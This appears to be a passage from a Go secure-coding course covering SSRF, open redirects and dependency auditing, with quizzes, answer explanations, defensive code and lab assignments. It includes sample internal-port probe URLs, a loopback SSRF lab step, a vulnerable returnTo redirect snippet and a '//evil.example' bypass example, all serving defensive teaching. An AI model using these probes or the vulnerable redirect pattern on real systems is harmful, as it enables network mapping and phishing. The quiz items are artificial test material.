The feature is supposed to preview a public hotel image, but the input is really an unrestricted request destination. An attacker can use the tool to make the server fetch its own /health endpoint, probe a private admin service, or contact a cloud metadata address. The preview might then return sensitive information that was never reachable from the attacker's network.

SSRF can also do damage even when the response is hidden or ignored. A forged request can scan internal ports or trigger state-changing actions on a service that trusts the local network. Maybe the attacker isn't trying to read the response, just get your server to take your database offline or delete a file.

Whenever a feature accepts a URL or slug for a server-side request, ask:

Which destinations does the feature actually need?

What can the server reach that the requesting user cannot?

#### Quiz
##### Question 1
Bearly Secure's admin image-preview handler passes the submitted URL to its Go HTTP client and displays part of the response. An administrator submits the app's loopback /health URL and receives the health response. Why is this SSRF even though the route requires an admin session?

1. The server can reach destinations the caller can't. (correct)
2. Loopback responses automatically grant CORS access.
3. JSON responses cause SSRF vulnerabilities.
4. Admin-only routes can't have SSRF vulnerabilities.

##### Question 2
A URL-checking feature returns only reachable or unreachable and never shows the fetched response. Which risk can still make it vulnerable to SSRF?

1. SSRF requires returning the complete response.
2. SSRF requires parsing the response as JSON.
3. It can probe ports or trigger trusted internal services. (correct)
4. Hidden responses turn server requests into CORS requests.

#### Explained
Both answers come straight from one idea in the lesson: SSRF is about the server's network position, not about what the caller can see or do.

Question 1: Why is the admin's loopback /health request SSRF?
Answer: The server can reach destinations the caller can't.

The admin submits a URL, and the server fetches it using its own network position. Loopback (127.0.0.1) only means something from the server's own point of view. From the admin's browser, it points at the admin's own machine. The server is making a request on the attacker's behalf to a place the caller couldn't reach directly. That is the "forged" part of the attack.

The admin session doesn't change this. It only controls who can use the feature. It doesn't limit where the feature can send requests. If an admin account is compromised, or the feature is abused, the same tool can reach internal admin services or cloud metadata endpoints.

Why the other options are wrong:

Loopback responses automatically grant CORS access: CORS is a browser mechanism. This request is server-to-server, so CORS isn't involved.

JSON responses cause SSRF vulnerabilities: The response format has nothing to do with it. The vulnerability is the unrestricted request destination.

Admin-only routes can't have SSRF vulnerabilities: This is false for the reason above. Authentication doesn't restrict the destination.

Question 2: The checker only says reachable or unreachable. Why is it still risky?
Answer: It can probe ports or trigger trusted internal services.

Not seeing the response doesn't make the request harmless. The request still leaves the server and lands somewhere. Two things can go wrong:

Probing: The attacker submits http://10.0.0.5:5432, :6379, and so on. "Reachable" versus "unreachable" tells them which internal hosts and ports are open, so they can map your private network.

Triggering actions: Some internal services trust anything coming from the local network. A forged request to one of them could take a database offline or delete a file, and the attacker never needs to read the reply.

Why the other options are wrong:

SSRF requires returning the complete response and SSRF requires parsing the response as JSON: Both treat reading the response as required. The lesson says SSRF can do damage even when the response is hidden or ignored.

Hidden responses turn server requests into CORS requests: Again, CORS only applies to browsers, and hiding a response doesn't change what kind of request it is.

The takeaway
Ask the two questions from the lesson about any feature that fetches a URL:

Which destinations does it actually need?

What can the server reach that the requesting user can't?

If the server can reach more than the user can, an unrestricted URL input gives the user that extra reach.

### L9: Defending Against SSRF
The safest SSRF defense is to avoid arbitrary destinations. If an app needs images from one provider, accept HTTPS URLs for that exact host and reject everything else.

Better yet, accept image IDs and build the URLs within server code.

Parse and validate the URL before sending a request:

func allowedURL(rawURL string) (*url.URL, bool) {
    parsed, err := url.Parse(rawURL)
    if err != nil || parsed.Scheme != "https" {
        return nil, false
    }
    if parsed.User != nil || parsed.Host != "images.example.com" {
        return nil, false
    }
    return parsed, true
}

Compare the parsed host exactly. That rejects unexpected ports and lookalike hosts such as images.example.com.attacker.test.

The HTTP client needs its own boundaries too. Set request, response-header, and TLS-handshake timeouts so a slow approved host can't hold resources indefinitely. Disable proxy discovery when it is not part of the feature's design.

Redirects need an explicit policy. Go's http.Client follows redirects by default, so an approved URL might redirect to an internal destination. A CheckRedirect function can return http.ErrUseLastResponse, leaving the redirect response unread for the caller to reject.

An exact-host allowlist avoids most DNS ambiguity, but if you truly need arbitrary public hosts, blocking private addresses gets much harder: validate every resolved IPv4 and IPv6 address and ensure the connection uses an address you checked. A separate DNS lookup followed by a normal request doesn't guarantee both operations use the same address, so it doesn't stop DNS rebinding by itself.

Assignment
Bearly Secure's image-preview service can fetch any destination the server can reach. Restrict previews to the exact approved HTTPS host.

Reset the database and start the app.

Log in as Theo (theo@example.com / password123) and use http://localhost:3030/admin/image-preview to fetch http://127.0.0.1:3030/health, then stop the app.

In internal/imagepreview/service.go, make allowedURL accept only URLs with:

the https scheme

no user credentials

the exact host storage.googleapis.com

Return an imagepreview.Error with the message Use an HTTPS URL from an allowed image host. when validation fails.

Give the HTTP client a five-second overall timeout, response-header timeout, and TLS-handshake timeout.

Disable proxy discovery and automatic redirects. Return redirect responses without reading their bodies.

Run and submit the CLI tests from the project root.

### L10: Open Redirects
An open redirect sends a user to a destination supplied by the requester. Unlike SSRF, the server isn't fetching the destination itself. The app is lending its trusted domain to an attacker-controlled redirect.

Imagine a conference site that carries a returnTo value through login and redirects to it afterward:

returnTo := request.FormValue("returnTo")
http.Redirect(responseWriter, request, returnTo, http.StatusFound)

If an attacker puts an external URL in a legitimate conference login link, the victim sees the trusted domain, signs in, and is immediately sent to a phishing site.


Open redirect diagram

A shared helper can return a requested path only when it is explicitly allowlisted:

var allowedPaths = map[string]struct{}{
    "/":        {},
    "/account": {},
    "/schedule": {},
}

func Safe(value string) string {
    if _, allowed := allowedPaths[value]; allowed {
        return value
    }
    return "/"
}

A check such as strings.HasPrefix(value, "/") isn't enough. A scheme-relative URL like //evil.example begins with a slash but still sends the browser to another host. Exact matching also rejects crafted prefixes and internal destinations the flow doesn't need.

Assignment
Bearly Secure already has an exact return-path allowlist, but its login handlers don't use it. Apply the shared redirect policy to every login flow.

In internal/httpserver/auth.go, update safeReturnTo to use returnto.Safe. This applies the shared policy to the password and TOTP handlers.

In internal/auth/passkeys/handler.go, replace both uses of unsafeReturnTo with returnto.Safe, then delete unsafeReturnTo.

Start the app and confirm /login?returnTo=%2Faccount returns to the account page after login while an external returnTo falls back to /.

With Bearly Secure still running, run and submit the CLI tests from the project root.

### L11: Risks of Dependencies
Modern apps depend on code their teams didn't write, and each dependency can bring transitive modules, maintainers, release processes, and new code into your security boundary.

A transitive dependency is a module required by one of your dependencies rather than directly by your app. It can be several levels deep.

An outdated module might have a known vulnerability. A compromised maintainer might publish a malicious release. An unexpected replace directive can redirect a trusted module path to different code. That's a lot of trust for one dependency change.

Go records direct requirements in go.mod and cryptographic checksums for downloaded module versions in go.sum:

require example.com/imagekit v1.4.2

Minimal version selection makes the module graph deterministic for a given go.mod, while go.sum helps detect downloaded content that does not match the expected checksum. Neither mechanism proves the selected code is safe, maintained, or appropriate.

Reproducible module selection and verified checksums do not make the selected code trustworthy.

Before adding a module, inspect its purpose, maintenance, transitive growth, and any replace or exclude directives. Ask whether its capability is worth the extra code and attack surface. Good engineers don't add a dependency to avoid a small amount of straightforward code!

#### Quiz

##### Question 1

A pull request adds an unexpected replace directive that redirects a familiar Go module path to an unfamiliar fork. Which is the clearest reason to block the change pending review?

1. The build may now trust and execute different source code. (correct)
2. Replace directives make direct dependencies transitive.
3. Go refuses to verify any module selected by a replace directive.
4. A replacement always upgrades the module to its newest version.

##### Question 2

Bearly Secure commits go.mod and go.sum. Which security claim about that process is accurate?

1. It prevents the module graph from containing transitive dependencies.
2. It helps reproduce and verify selected module content, but doesn't prove safety. (correct)
3. It automatically upgrades dependencies when fixes are published.
4. Go verifies every selected module as free of vulnerabilities.

##### Question 3

A developer proposes adding an unmaintained module to avoid writing a small amount of straightforward code. Which is the best security review response?

1. Reject it unless its value justifies the added supply-chain risk. (correct)
2. Approve it if no vulnerability advisory exists.
3. Approve it because dependencies are safer than short application code.
4. Approve it as an indirect dependency instead.

#### Explained

Here is why each of those answers is correct:

1. Unexpected replace directive
Answer: The build may now trust and execute different source code.

A replace directive in go.mod tells Go to swap out a module path for a different one (such as a fork or a local directory). If a pull request introduces an unexpected replace pointing to an unfamiliar fork, your build will silently pull in, trust, and execute code from that fork instead of the original module.

2. Committing go.mod and go.sum
Answer: It helps reproduce and verify selected module content, but doesn't prove safety.

go.mod ensures reproducibility by recording your direct requirements so minimal version selection produces the same module graph.

go.sum ensures integrity by storing cryptographic checksums to detect if downloaded module content doesn't match what's expected.

Neither of these mechanisms inspects the code for vulnerabilities, bugs, or malicious behavior—they only ensure you get the exact same code every time.

3. Adding an unmaintained module for straightforward code
Answer: Reject it unless its value justifies the added supply-chain risk.

Every dependency you add expands your security boundary, bringing in new maintainers, release processes, and potential transitive dependencies. If a module is unmaintained and only saves you from writing a small amount of simple code, the added supply-chain risk outweighs the convenience.

### L12: Auditing Dependencies
Go provides separate checks for module integrity, module hygiene, and known vulnerabilities.

go mod verify
go mod tidy -diff
go run golang.org/x/vuln/cmd/govulncheck@latest ./...

go mod verify checks that downloaded module content still matches the recorded hashes.

go mod tidy -diff reports whether the module files, go.mod and go.sum, need any changes. Running it without -diff would also make those changes.

govulncheck compares the application's reachable code with published Go vulnerability data.

A clean report is useful, but it is not proof that the dependencies are safe. An unpublished vulnerability, malicious behavior without an advisory, or risky application code could still be present even if all these checks pass.

When a scan does report a vulnerability, make sure to inspect the affected call path, the fixed version of the dependency, and possible compatibility impact before updating.

Assignment
Verify Bearly Secure's module graph and audit its dependencies without changing the project.

These commands may print go: downloading ... while fetching dependencies. That's normal; wait for each command to finish before interpreting the result.

Run go mod verify. If it succeeds, it should print all modules verified.

Run go mod tidy -diff. There should be no diff; that means the module files are already tidy.

Run the vulnerability scanner and review the report:

go run golang.org/x/vuln/cmd/govulncheck@latest ./...

It should print: No vulnerabilities found.

If everything looks clean, run and submit the CLI tests from the project root.